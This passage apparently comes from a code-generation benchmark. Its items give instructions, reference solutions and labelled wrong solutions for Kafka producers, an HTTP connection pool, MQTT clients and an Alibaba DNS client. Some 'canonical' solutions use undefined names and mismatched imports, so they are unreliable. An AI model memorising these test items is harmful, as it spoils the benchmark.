\"test_0\",\n                \"*COMMIT*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._total_written_after_commit = 0\n            self._current_seq_id += 1\n\n        if self._total_written == self._limit:\n            self._producer.send(\n                \"test_0\",\n                \"*FINISH*\".encode(\"utf-8\"),\n                partition=0,\n            )\n            self._producer.close()\n            exit(0)\n\n    def close(self):\n        self._producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "wrong_result": "import json\nfrom datetime import datetime, timedelta\nfrom confluent_kafka import Producer\nfrom typing import List\n\nclass KafkaWriter:\n    def __init__(self, max_batch_size: int, max_batch_lifetime_sec: int, limit: int) -> None:\n        self._max_batch_size = max_batch_size\n        self._max_batch_lifetime = timedelta(seconds=max_batch_lifetime_sec)\n        self._limit = limit\n        self._total_written = 0\n        self._total_written_after_commit = 0\n        self._last_commit_at = datetime.now()\n        self._current_seq_id = 0\n        self._current_batch: List[str] = []\n        self._producer = Producer({'bootstrap.servers': 'localhost:9092', 'topic': 'my-topic'})\n\n    def write(self, json_data: dict) -> None:\n        json_str = json.dumps(json_data)\n        self._current_batch.append(json_str)\n        \n        if len(self._current_batch) >= self._max_batch_size or (datetime.now() - self._last_commit_at) > self._max_batch_lifetime:\n            self._commit_batch()\n\n    def _commit_batch(self):\n        batch = self._current_batch\n        futures = [self._producer.send('my-topic', value=msg) for msg in batch]\n        \n        for future in futures:\n            future.get()\n        \n        self._total_written += len(batch)\n        self._total_written_after_commit = 0\n        self._last_commit_at = datetime.now()\n        self._current_seq_id += 1\n        self._current_batch = []\n        \n        if self._total_written >= self._limit:\n            self.close()\n\n    def close(self) -> None:\n        self._producer.close()"
  },
  {
    "Task_id": 26,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a specified host, handling connection creation, request execution, and response processing with support for retries, timeouts, and redirects.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that provides efficient reuse of connections to a specified host. It handles connection lifecycle, request execution, error handling, and retries.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- host: str - The normalized hostname for connections\n- port: int - The port number for connections\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL if configured\n- proxy_headers: dict - Headers for proxy connections\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None\n  - Initializes the connection pool with target host and configuration\n  - Input: \n    - host: str - Target hostname\n    - port: int - Target port (optional)\n    - timeout: Timeout - Timeout configuration\n    - retries: Retry - Retry configuration\n    - _proxy: str - Proxy URL (optional)\n    - _proxy_headers: dict - Proxy headers (optional)\n    - conn_kw: dict - Additional connection parameters\n\n- _new_conn() -> HTTPConnection\n  - Creates a new HTTP connection\n  - Output: HTTPConnection - A new connection instance\n\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse\n  - Executes an HTTP request through the given connection\n  - Input:\n    - conn: HTTPConnection - Connection to use\n    - method: str - HTTP method (GET, POST, etc.)\n    - url: str - Target URL\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Whether to use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response\n\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse\n  - Main method to execute HTTP requests with connection pooling\n  - Input:\n    - method: str - HTTP method\n    - url: str - Target URL\n    - body: str - Request body (optional)\n    - headers: dict - Request headers (optional)\n    - retries: Retry - Retry configuration (optional)\n    - redirect: bool - Whether to follow redirects\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response",
    "Canonical_solution": "import socket\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, _encode_target\nfrom .util.url import _normalize_host as normalize_host\nfrom .util.url import get_host, parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = _normalize_host(host, scheme=self.scheme)\n        self._proxy_host = host.lower()\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=response_conn,\n                retries=retries,\n                **response_kw\n            )\n\n        except (\n            TimeoutError,\n            HTTPException,\n            SocketError,\n            ProtocolError,\n            BaseSSLError,\n            SSLError,\n            CertificateError,\n        ) as e:\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            conn = conn and conn.close()\n\n        finally:\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import http.client\nimport socket\nimport queue\nimport time\n\nclass Retry:\n    def __init__(self, total=3, connect=0, read=0, redirect=0):\n        self.total = total\n        self.connect = connect\n        self.read = read\n        self.redirect = redirect\n\nclass Timeout:\n    DEFAULT_TIMEOUT = 10\n\nclass HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = 'http'\n        self.host = host\n        self.port = port or 80\n        self.timeout = timeout\n        self.retries = retries or Retry()\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n        self.strict = strict\n        self.maxsize = maxsize\n        self.block = block\n        self.headers = headers or {}\n        self.connections = queue.Queue(maxsize=self.maxsize)\n        for _ in range(self.maxsize):\n            self.connections.put(self._new_conn())\n\n    def _new_conn(self):\n        return http.client.HTTPConnection(self.host, self.port, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=None, chunked=False, **httplib_request_kw):\n        if timeout is None:\n            timeout = self.timeout\n        headers = self.headers.copy()\n        headers.update(httplib_request_kw.get('headers', {}))\n        try:\n            conn.request(method, url, **httplib_request_kw)\n            resp = conn.getresponse()\n            return resp\n        except http.client.HTTPException as e:\n            raise RuntimeError(f\"HTTP request failed: {e}\")\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=Timeout.DEFAULT_TIMEOUT, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        retries = retries or self.retries\n        for i in range(retries.total + 1):\n            try:\n                conn = self.connections.get(block=self.block)\n                try:\n                    resp = self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **response_kw)\n                    if redirect and 300 <= resp.status < 400:\n                        location = resp.getheader('Location')\n                        if location:\n                            url = location\n                            conn.close()\n                            self.connections.put(conn)\n                            continue\n                    return resp\n                except Exception as e:\n                    if i < retries.total:\n                        continue\n                    else:\n                        raise\n                finally:\n                    if release_conn is not None:\n                        release_conn(conn)\n                    else:\n                        conn.close()\n            except queue.Empty:\n                conn = self._new_conn()\n                try:\n                    resp = self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **response_kw)\n                    if redirect and 300 <= resp.status < 400:\n                        location = resp.getheader('Location')\n                        if location:\n                            url = location\n                            conn.close()\n                            self.connections.put(conn)\n                            continue\n                    return resp\n                finally:\n                    if release_conn is not None:\n                        release_conn(conn)\n                    else:\n                        conn.close()\n        raise Exception(\"All retries failed\")"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with special commit markers before and after the data transmission.\n\nFunction Description: The function establishes a connection to a Kafka broker, reads movie rating data from a CSV file, converts each record to JSON format, and sends them to a predefined Kafka topic. It sends a \"*COMMIT*\" marker before and after the data transmission to indicate the start and end of the dataset. The function includes delays to ensure proper message delivery and resource cleanup.\n\nInput: None (The function uses hardcoded values for the Kafka broker configuration and file path)\n\nOutput: None (The function's effect is the messages sent to the Kafka topic)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"redpanda:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "import confluent_kafka\nimport pandas as pd\nimport json\nimport time\n\ndef send_movie_ratings_to_kafka():\n    conf = {\n        'bootstrap.servers': 'localhost:9092',\n        'topic': 'movie_ratings'\n    }\n    producer = confluent_kafka.Producer(conf)\n\n    csv_file_path = 'movie_ratings.csv'\n    df = pd.read_csv(csv_file_path)\n\n    # Send start commit marker\n    producer.produce('movie_ratings', value='*COMMIT*')\n    producer.poll(1)\n\n    for index, row in df.iterrows():\n        json_data = json.dumps(row.to_dict())\n        producer.produce('movie_ratings', value=json_data)\n        producer.poll(1)\n        time.sleep(0.1)\n\n    # Send end commit marker\n    producer.produce('movie_ratings', value='*COMMIT*')\n    producer.poll(1)\n\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 262,
    "Instruction": "Task Description: Create a function that initializes a Kafka producer, sends a specified number of records to a Kafka topic, and properly manages resources.\n\nFunction Description: The function `create_kafka_producer` sets up a Kafka producer with given configurations, sends a specified number of records (of a given size) to a specified topic, and ensures proper resource cleanup. It handles both string and integer configuration values, and dynamically sets the bootstrap servers if brokers are provided.\n\nInput:  \n- `args`: [argparse.Namespace or dict] - Contains the following fields:  \n  - `consumer_config`: [list of str] - List of key-value pairs for Kafka producer configuration (e.g., `['key1=value1', 'key2=value2']`).  \n  - `brokers`: [list or None] - Optional list of broker addresses to dynamically set `bootstrap_servers`.  \n  - `record_size`: [int] - Size of each record (in bytes) to be sent.  \n  - `fixture_compression`: [str] - Compression type for the producer (e.g., `'gzip'`, `'snappy'`).  \n  - `num_records`: [int] - Number of records to produce.  \n  - `topic`: [str] - Kafka topic to which records will be sent.  \n\nOutput:  \n- None: The function does not return a value but prints status messages (e.g., bootstrap servers, production status).  \n- Side Effects:  \n  - Sends records to the specified Kafka topic.  \n  - Prints diagnostic information to stdout.  \n  - Properly closes the Kafka producer to release resources.",
    "Canonical_solution": "import argparse\nimport logging\nimport sys\nimport threading\nfrom kafka import KafkaProducer\n\nlogging.basicConfig(level=logging.ERROR)\n\ndef create_kafka_producer(args):\n    props = {}\n    for prop in args.consumer_config:\n        k, v = prop.split('=')\n        try:\n            v = int(v)\n        except ValueError:\n            pass\n        if v == 'None':\n            v = None\n        props[k] = v\n\n    if args.brokers:\n        brokers = start_brokers(args.brokers)\n        props['bootstrap_servers'] = ['{0}:{1}'.format(broker.host, broker.port)\n                                      for broker in brokers]\n        print('---> bootstrap_servers={0}'.format(props['bootstrap_servers']))\n        print()\n\n        print('-> Producing records')\n        record = bytes(bytearray(args.record_size))\n        producer = KafkaProducer(compression_type=args.fixture_compression,\n                                 **props)\n        for i in range(args.num_records):\n            producer.send(topic=args.topic, value=record)\n        producer.flush()\n        producer.close()\n        print('-> OK!')\n        print()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "import confluent_kafka as kafka\nimport secrets\nimport argparse\n\ndef create_kafka_producer(args):\n    if isinstance(args, argparse.Namespace):\n        args = args.__dict__\n    consumer_config = args.get('consumer_config', [])\n    brokers = args.get('brokers', None)\n    record_size = args.get('record_size', 0)\n    fixture_compression = args.get('fixture_compression', 'none')\n    num_records = args.get('num_records', 0)\n    topic = args.get('topic', '')\n    config = {}\n    for line in consumer_config:\n        key, val = line.split('=', 1)\n        if val.isdigit():\n            config[key] = int(val)\n        else:\n            config[key] = val\n    if brokers:\n        bootstrap_servers = ','.join(brokers)\n        config['bootstrap.servers'] = bootstrap_servers\n        print(f\"Bootstrap servers set to: {bootstrap_servers}\")\n    else:\n        print(\"Bootstrap servers not set.\")\n    config['compression.type'] = fixture_compression\n    producer = kafka.Producer(config)\n    print(f\"Bootstrap servers: {config.get('bootstrap.servers', 'not set')}\")\n    for i in range(num_records):\n        value = secrets.token_bytes(record_size)\n        producer.produce(topic, value=value)\n        print(f\"Produced record {i+1} of size {record_size} bytes\")\n    producer.flush()\n    producer.close()\n    print(f\"Sent {num_records} records to topic {topic}\")"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Create a Python class that implements an MQTT subscriber client using the Paho MQTT library, capable of connecting to an MQTT broker, subscribing to topics, and handling incoming messages with configurable authentication and TLS options.\n\nClass Description: The MQTTSubscriber class provides a configurable MQTT client implementation for subscribing to topics and processing messages from an MQTT broker. It supports various connection options including TLS encryption and authentication.\n\nAttributes:\n- host: str - The MQTT broker host address (default: \"mqtt.eclipseprojects.io\")\n- topic: str - The topic to subscribe to (default: \"$SYS/#\")\n- qos: int - Quality of Service level for the subscription (default: 0)\n- clientid: str - Client identifier for the MQTT connection (default: None)\n- username: str - Username for broker authentication (default: None)\n- password: str - Password for broker authentication (default: None)\n- port: int - Broker connection port (default: None, auto-detected)\n- keepalive: int - Connection keepalive period in seconds (default: 60)\n- use_tls: bool - Flag to enable TLS encryption (default: False)\n- insecure: bool - Flag to disable certificate verification (default: False)\n- cacerts: str - Path to CA certificate file (default: None)\n- tls_version: str - TLS protocol version (default: None)\n- debug: bool - Flag to enable debug logging (default: False)\n- disable_clean_session: bool - Flag to disable clean session (default: False)\n- mqttc: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host, topic, qos, clientid, username, password, port, keepalive, use_tls, insecure, cacerts, tls_version, debug, disable_clean_session) -> None - Initializes the MQTT subscriber with configuration parameters\n- _setup_callbacks() -> None - Sets up the MQTT client callback functions\n- _configure_tls() -> None - Configures TLS settings for secure connections\n- _configure_authentication() -> None - Configures username/password authentication\n- on_connect(mqttc, obj, flags, reason_code, properties) -> None - Callback for connection events\n- on_message(mqttc, obj, msg) -> None - Callback for incoming messages\n- on_publish(mqttc, obj, mid) -> None - Callback for publish events\n- on_subscribe(mqttc, obj, mid, reason_code_list, properties) -> None - Callback for subscription events\n- on_log(mqttc, obj, level, string) -> None - Callback for debug logging\n- connect_and_subscribe() -> None - Connects to the broker and starts the message loop",
    "Canonical_solution": "import argparse\nimport ssl\nimport paho.mqtt.client as mqtt\n\nclass MQTTSubscriber:\n    def __init__(self, host=\"mqtt.eclipseprojects.io\", topic=\"$SYS/#\", qos=0, clientid=None,\n                 username=None, password=None, port=None, keepalive=60, use_tls=False,\n                 insecure=False, cacerts=None, tls_version=None, debug=False,\n                 disable_clean_session=False):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n\n        self.mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, self.clientid,\n                                clean_session=not self.disable_clean_session)\n\n        self._setup_callbacks()\n        self._configure_tls()\n        self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        if self.debug:\n            self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        if self.use_tls or self.cacerts:\n            if self.tls_version == \"tlsv1.2\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_2\n            elif self.tls_version == \"tlsv1.1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_1\n            elif self.tls_version == \"tlsv1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1\n            else:\n                tlsVersion = None\n\n            cert_required = ssl.CERT_NONE if self.insecure else ssl.CERT_REQUIRED\n            self.mqttc.tls_set(ca_certs=self.cacerts, certfile=None, keyfile=None,\n                              cert_reqs=cert_required, tls_version=tlsVersion)\n            if self.insecure:\n                self.mqttc.tls_insecure_set(True)\n\n    def _configure_authentication(self):\n        if self.username or self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(\"reason_code: \" + str(reason_code))\n\n    def on_message(self, mqttc, obj, msg):\n        print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\n    def on_publish(self, mqttc, obj, mid):\n        print(\"mid: \" + str(mid))\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\n    def on_log(self, mqttc, obj, level, string):\n        print(string)\n\n    def connect_and_subscribe(self):\n        if self.port is None:\n            self.port = 8883 if (self.use_tls or self.cacerts) else 1883\n\n        print(f\"Connecting to {self.host} port: {self.port}\")\n        self.mqttc.connect(self.host, self.port, self.keepalive)\n        self.mqttc.subscribe(self.topic, self.qos)\n        self.mqttc.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "import paho.mqtt.client as mqtt\nimport ssl\n\nclass MQTTSubscriber:\n    def __init__(self, host, topic, qos, clientid, username, password, port, keepalive, use_tls, insecure, cacerts, tls_version, debug, disable_clean_session):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n\n        self.mqttc = mqtt.Client(clientid=self.clientid, clean_session=self.disable_clean_session)\n        if self.debug:\n            self.mqttc.enable_debug()\n        self._setup_callbacks()\n\n        if self.use_tls:\n            self._configure_tls()\n\n        if self.username or self.password:\n            self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        self.mqttc.tls_set(\n            ca_certs=self.cacerts,\n            certfile=None,\n            keyfile=None,\n            tls_version=self.tls_version,\n            cert_reqs=ssl.CERT_REQUIRED if not self.insecure else ssl.CERT_NONE\n        )\n\n    def _configure_authentication(self):\n        if self.username and self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        if reason_code == 0:\n            print(\"Connected to MQTT broker\")\n            mqttc.subscribe(self.topic, self.qos)\n        else:\n            print(f\"Failed to connect, reason code {reason_code}\")\n\n    def on_message(self, mqttc, obj, msg):\n        print(f\"Received message: {msg.topic} - {msg.payload.decode()}\")\n\n    def on_publish(self, mqttc, obj, mid):\n        print(f\"Message published with mid: {mid}\")\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(f\"Subscribed with mid: {mid}, reason codes: {reason_code_list}\")\n\n    def on_log(self, mqttc, obj, level, string):\n        print(f\"Log: {string}\")\n\n    def connect_and_subscribe(self):\n        if self.port is None:\n            self.port = 8883 if self.use_tls else 1883\n\n        self.mqttc.connect(\n            host=self.host,\n            port=self.port,\n            keepalive=self.keepalive,\n            bind_address=\"\"\n        )\n\n        self.mqttc.loop_start()"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client using the Paho MQTT library to subscribe to topics, handle incoming messages, and trigger appropriate actions based on the received messages.\n\nClass Description: The `MqttClient` class is a threaded MQTT client that connects to a broker, subscribes to specified topics, and processes incoming messages. It supports secure connections with TLS and authentication. Messages can be in JSON format and are routed to designated synapses (processing units) based on the topic.\n\nAttributes:\n\n- broker: [object] - Contains broker configuration details (client_id, protocol, username, password, ca_cert, certfile, keyfile, tls_insecure, broker_ip, port, keepalive, topics)\n- brain: [object] - Reference to the main processing unit that manages synapses\n- client: [paho.mqtt.client.Client] - The MQTT client instance\n\nMethods:\n\n- __init__(broker=None, brain=None) -> [None] - Initializes the MQTT client with broker configuration and brain reference. Sets up connection callbacks and security parameters.\n- run() -> [None] - Connects to the broker and starts the MQTT loop in a separate thread. Handles socket errors gracefully.\n- on_connect(client, userdata, flags, rc) -> [None] - Callback for connection events. Subscribes to all configured topics on successful connection (rc=0).\n- on_message(client, userdata, msg) -> [None] - Callback for incoming messages. Routes messages to concerned synapses based on topic.\n- on_subscribe(mqttc, obj, mid, granted_qos) -> [None] - Callback for subscription confirmation (currently no operation).\n- call_concerned_synapses(topic_name, message) -> [None] - Processes incoming messages, converts JSON if needed, and triggers appropriate synapses.\n- _get_protocol(protocol) -> [int] - Static method that converts protocol string to Paho MQTT protocol constant.",
    "Canonical_solution": "import json\nimport logging\nimport socket\nfrom threading import Thread\nimport paho.mqtt.client as mqtt\n\nclass MqttClient(Thread):\n    def __init__(self, broker=None, brain=None):\n        super(MqttClient, self).__init__()\n        self.broker = broker\n        self.brain = brain\n\n        self.client = mqtt.Client(client_id=self.broker.client_id, protocol=self._get_protocol(self.broker.protocol))\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n        if self.broker.username is not None and self.broker.password is not None:\n            self.client.username_pw_set(self.broker.username, self.broker.password)\n\n        if self.broker.ca_cert is not None and self.broker.certfile is not None and self.broker.keyfile is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert,\n                               certfile=self.broker.certfile,\n                               keyfile=self.broker.keyfile)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n        elif self.broker.ca_cert is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_forever()\n        except socket.error:\n            pass\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                client.subscribe(topic.name)\n        else:\n            self.client.disconnect()\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        target_topic = next(topic for topic in self.broker.topics if topic.name == topic_name)\n        if target_topic.is_json:\n            message = json.loads(message)\n        \n        for synapse in target_topic.synapses:\n            overriding_parameter_dict = dict()\n            overriding_parameter_dict[\"mqtt_subscriber_message\"] = message\n            SynapseLauncher.start_synapse_by_list_name([synapse.name],\n                                                     brain=self.brain,\n                                                     overriding_parameter_dict=overriding_parameter_dict)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == \"MQTTv31\":\n            return paho.mqtt.client.MQTTv31\n        return paho.mqtt.client.MQTTv311",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "import threading\nimport paho.mqtt.client as mqtt\nimport json\n\nclass MqttClient:\n    def __init__(self, broker=None, brain=None):\n        self.broker = broker\n        self.brain = brain\n        self.client = mqtt.Client(\n            client_id=broker.client_id,\n            protocol=self._get_protocol(broker.protocol)\n        )\n        self.client.username_pw_set(broker.username, broker.password)\n        self.client.tls_insecure_accept = broker.tls_insecure\n        self.client.tls_set(\n            ca_certs=broker.ca_cert,\n            certfile=broker.certfile,\n            keyfile=broker.keyfile\n        )\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_start()\n        except Exception as e:\n            print(f\"Error connecting to broker: {e}\")\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                client.subscribe(topic)\n        else:\n            print(f\"Failed to connect, return code {rc}\")\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        try:\n            data = json.loads(message)\n        except json.JSONDecodeError:\n            data = message\n        self.brain.process_message(topic_name, data)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == 'mqtt':\n            return 4\n        elif protocol == 'mosquitto':\n            return 5\n        else:\n            raise ValueError(f\"Unsupported protocol: {protocol}\")"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Alibaba Cloud DNS API, handling request signing, connection management, and response processing.\n\nClass Description: The API class provides methods to send authenticated requests to Alibaba Cloud's DNS API. It handles parameter signing, HTTP connection management (with optional proxy support), and response processing.\n\nAttributes:\n\nID: [str] - API access key ID stored in Config class\nTOKEN: [str] - API access token stored in Config class\nPROXY: [str/None] - Optional proxy server address stored in Config class\nTTL: [int/None] - Optional time-to-live value stored in Config class\nSITE: [str] - API endpoint domain (constant in API class)\nMETHOD: [str] - Default HTTP method (constant in API class)\n\nMethods:\n\nrequest: [request](param=None, **params) -> [dict] - Main method to send API requests. Takes optional dictionary or keyword parameters, signs them, sends HTTP request, and returns parsed response. Raises exception on error.\nsignature: [signature](params) -> [dict] - Internal method to sign request parameters (implementation not shown in reference code)\n__init__: [__init__]() -> [None] - Constructor for Config class to initialize credentials and settings\ngetresponse: [getresponse]() -> [HTTPResponse] - Internal method to get HTTP response (called through connection object)\nclose: [close]() -> [None] - Internal method to close HTTP connection (called through connection object)",
